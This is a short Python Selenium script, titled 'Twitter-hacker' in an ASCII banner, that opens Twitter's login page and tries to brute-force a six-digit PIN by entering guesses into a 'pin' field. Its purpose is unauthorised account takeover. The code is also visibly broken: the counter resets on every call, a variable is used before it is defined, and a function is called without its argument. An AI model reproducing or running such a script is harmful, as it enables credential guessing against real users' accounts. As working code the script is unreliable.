from selenium import webdriver
from selenium.webdriver.common.keys import Keys

options = webdriver.ChromeOptions()
options.add_experimental_option("excludeSwitches", ["enable-logging"])
driver = webdriver.Chrome(options=options)
global_list = 0
fn_result = 0
url = "https://twitter.com/login"
#https://twitter.com/account/send_password_reset
driver.get(url)
command = input("Enter: ")
def intro():
    title = '''
     _____        _ _   _                   _                _             
    |_   _|      (_) | | |                 | |              | |            
      | |_      ___| |_| |_ ___ _ __ ______| |__   __ _  ___| | _____ _ __ 
      | \ \ /\ / / | __| __/ _ \ '__|______| '_ \ / _` |/ __| |/ / _ \ '__|
      | |\ V  V /| | |_| ||  __/ |         | | | | (_| | (__|   <  __/ |   
      \_/ \_/\_/ |_|\__|\__\___|_|         |_| |_|\__,_|\___|_|\_\___|_|   
    '''
    print(title)
    print("Welcome!")
    print("please choose number:")
    print("1.tutorial")
    print("2.start hacking")
    print("3.exit")
def bruteforce(num):
    num = [0,0,0,0,0,-1]
    num[5] = num[5] + 1
    if num[5] == 10:
        num[5] = 0
        num[4] = num[4] + 1
    if num[4] == 10:
        num[4] = 0
        num[3] = num[3] + 1
    if num[3] == 10:
        num[3] = 0
        num[2] = num[2] + 1
    if num[2] == 10:
        num[2] = 0
        num[1] = num[1] + 1
    if num[1] == 10:
        num[1] = 0
        num[0] = num[0] + 1 
    if num[0] == 10:
        print("Brute force failed")
    else:
        print("unknown error occured")
    return num


if command == "start":
    print("Start bruteforce")
    i = 0
    while i == 0:
        fn_result = bruteforce(global_list)
        result_global = str(result_global[0]) + str(result_global[1]) + str(result_global[2]) + str(result_global[3]) + str(result_global[4]) + str(result_global[5])
        driver.find_element_by_name('pin').send_keys(bruteforce())
        driver.find_element_by_name('pin').send_keys(Keys.ENTER)
    #name: text or pin

